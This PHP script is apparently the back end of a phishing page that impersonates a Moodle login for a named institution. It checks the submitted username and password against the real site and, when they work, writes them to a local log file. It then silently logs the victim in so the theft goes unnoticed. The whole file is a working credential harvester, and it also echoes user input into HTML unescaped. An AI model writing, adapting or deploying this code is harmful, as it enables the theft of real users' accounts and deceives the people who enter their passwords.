<?php
ob_start();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://vidyalankarlive.com/moodle/login/index.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($_POST));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies,txt");
$out = curl_exec($ch);
curl_close($ch);

$cookie = strpos($out, "MOODLEID1_");
if ($cookie) {
	$handle=fopen("log.txt","a");
	foreach($_POST as $variable=>$value){
		fwrite($handle,$variable);
		fwrite($handle, "=");
		fwrite($handle, $value);
		fwrite($handle, "\r\n");
	}
	fwrite($handle, "\r\n");
	fclose($handle);

	?>
	<html>
	<body>
		<form id = "form" action = "http://vidyalankarlive.com/moodle/login/index.php" method = "post">
			<input name = "username" type = "hidden" value = <?php echo $_POST["username"]; ?>>
			<input name = "password" type = "hidden" value = <?php echo $_POST["password"]; ?>>
		</form>
		<script type = "text/javascript">document.getElementById("form").submit();</script>
		</body>
	</html>
	<?php
	
}
else {
	header('Location: index.php', 'Referer: login.php');
	exit();
}
ob_end_flush();